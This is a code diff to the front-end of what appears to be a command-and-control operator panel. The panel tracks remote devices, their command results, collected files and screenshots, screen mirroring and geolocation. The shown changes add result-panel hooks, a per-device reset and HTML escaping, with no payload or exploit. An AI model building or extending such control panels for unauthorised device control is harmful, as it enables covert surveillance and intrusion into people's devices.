@@ -149,6 +149,7 @@
         3200
       );
       removeFromQueue(cmd.id);
+      window.__c2Results?.record(cmd);
       if (state.current && cmd.device_id === state.current.id) {
         Terminal.onResult(cmd);
       }
@@ -157,6 +158,7 @@
       C2.activity("📁", `file: ${file.filename} (${C2.fmtBytes(file.size_bytes)})`, "info");
       if (state.current && file.device_id === state.current.id) {
         loadFiles(state.current.id);
+        window.__c2Results?.onNewFile(file);
         if (file.category === "screenshot") refreshMirrorOnce();
       }
     });
@@ -441,6 +443,10 @@
     Terminal.setDevice(dev.id);
     Terminal.write(`[session] attached to device #${dev.id}`, "in");
 
+    // Results are per-device; without this the panel shows the previous
+    // device's payloads under the new device's name.
+    window.__c2Results?.reset();
+
     if (dev.latitude && dev.longitude) GlobeViz.focusOn(dev.latitude, dev.longitude);
     state.socket.emit("subscribe", { device_id: dev.id });
 
@@ -574,7 +580,7 @@
         <div class="preview">${preview}</div>
         <div class="info">
           <span class="fn">${C2.escapeHtml(f.filename)}</span>
-          <span>${f.category} · ${C2.fmtBytes(f.size_bytes)}</span>
+          <span>${C2.escapeHtml(f.category)} · ${C2.fmtBytes(f.size_bytes)}</span>
           <span class="hash">${(f.sha256 || "").slice(0, 12)}</span>
         </div>
         <div class="file-actions">
